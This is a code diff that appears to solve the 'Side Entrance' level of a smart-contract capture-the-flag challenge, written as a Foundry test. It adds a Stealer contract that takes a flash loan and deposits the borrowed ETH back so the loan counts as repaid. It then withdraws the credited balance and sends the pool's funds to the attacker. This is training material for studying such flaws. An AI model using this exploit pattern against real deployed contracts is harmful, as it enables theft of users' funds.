@@ -36,7 +36,10 @@ contract SideEntrance is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        Stealer s = new Stealer(attacker, address(sideEntranceLenderPool));
+        s.getFlashLoan(ETHER_IN_POOL);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -47,5 +50,28 @@ contract SideEntrance is Test {
     function validation() internal {
         assertEq(address(sideEntranceLenderPool).balance, 0);
         assertGt(attacker.balance, attackerInitialEthBalance);
+    }
+}
+
+contract Stealer {
+    SideEntranceLenderPool sp;
+    address attacker;
+
+    constructor(address _attacker, address _poolAddress) {
+        sp = SideEntranceLenderPool(_poolAddress);
+        attacker = _attacker;
+    }
+
+    function getFlashLoan(uint256 amount) external {
+        sp.flashLoan(amount);
+        sp.withdraw();
+    }
+
+    function execute() external payable {
+        sp.deposit{value: msg.value}();
+    }
+
+    receive() external payable {
+        address(attacker).call{value: address(this).balance}("");
     }
 }
